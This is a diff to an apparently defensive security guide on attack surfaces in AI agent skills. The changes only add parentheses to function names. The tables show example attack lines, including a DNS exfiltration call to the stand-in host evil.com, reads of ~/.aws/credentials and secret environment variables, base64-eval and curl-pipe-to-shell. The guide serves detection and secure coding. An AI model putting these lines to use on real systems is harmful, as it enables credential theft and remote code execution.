@@ -48,10 +48,10 @@ AI agent skills have three attack surfaces:
 
 | Vector | Technique | Example |
 |--------|-----------|---------|
-| Direct exec | `eval`, `exec`, `os.system` | `eval(base64.b64decode("..."))` |
+| Direct exec | `eval()`, `exec()`, `os.system()` | `eval(base64.b64decode("..."))` |
 | Shell injection | `subprocess(shell=True)` | `subprocess.call(f"echo {user_input}", shell=True)` |
-| Deserialization | `pickle.loads` | Pickled payload in assets/ |
-| Dynamic import | `__import__` | `__import__('os').system('...')` |
+| Deserialization | `pickle.loads()` | Pickled payload in assets/ |
+| Dynamic import | `__import__()` | `__import__('os').system('...')` |
 | Pipe-to-shell | `curl ... \| sh` | In setup scripts |
 
 ### T2: Data Exfiltration
@@ -60,7 +60,7 @@ AI agent skills have three attack surfaces:
 
 | Vector | Technique | Example |
 |--------|-----------|---------|
-| HTTP POST | `requests.post` to external | Send ~/.ssh/id_rsa to attacker |
+| HTTP POST | `requests.post()` to external | Send ~/.ssh/id_rsa to attacker |
 | DNS exfil | Encode data in DNS queries | `socket.gethostbyname(f"{data}.evil.com")` |
 | Env harvesting | Read sensitive env vars | `os.environ["AWS_SECRET_ACCESS_KEY"]` |
 | File read | Access credential files | `open(os.path.expanduser("~/.aws/credentials"))` | <!-- noqa: SEC-AUDITOR -->
@@ -121,9 +121,9 @@ AI agent skills have three attack surfaces:
 
 | Risk | What to Check |
 |------|---------------|
-| Command injection | `os.system`, `subprocess(shell=True)`, backticks |
-| Code execution | `eval`, `exec`, `__import__`, `compile` |
-| Obfuscation | base64, hex encoding, chr chains |
+| Command injection | `os.system()`, `subprocess(shell=True)`, backticks |
+| Code execution | `eval()`, `exec()`, `__import__()`, `compile()` |
+| Obfuscation | base64, hex encoding, chr() chains |
 | Network access | requests, urllib, socket, httpx, aiohttp |
 | Credential access | Reading ~/.ssh, ~/.aws, env vars |
 | Filesystem scope | Writing outside skill directory |
@@ -234,16 +234,16 @@ echo 'alias python="python3 -c \"import urllib.request; urllib.request.urlopen(\
 
 ### Do
 
-- Use `subprocess.run` with list arguments (no shell=True)
+- Use `subprocess.run()` with list arguments (no shell=True)
 - Pin all dependency versions exactly (`package==1.2.3`)
 - Keep file operations within the skill directory
 - Document any required permissions explicitly
-- Use `json.loads` instead of `pickle.loads`
-- Use `yaml.safe_load` instead of `yaml.load`
+- Use `json.loads()` instead of `pickle.loads()`
+- Use `yaml.safe_load()` instead of `yaml.load()`
 
 ### Don't
 
-- Use `eval`, `exec`, `os.system`, or `compile`
+- Use `eval()`, `exec()`, `os.system()`, or `compile()`
 - Access credential files or sensitive env vars <!-- noqa: SEC-AUDITOR -->
 - Make outbound network requests (unless core to functionality)
 - Include binary files in skills
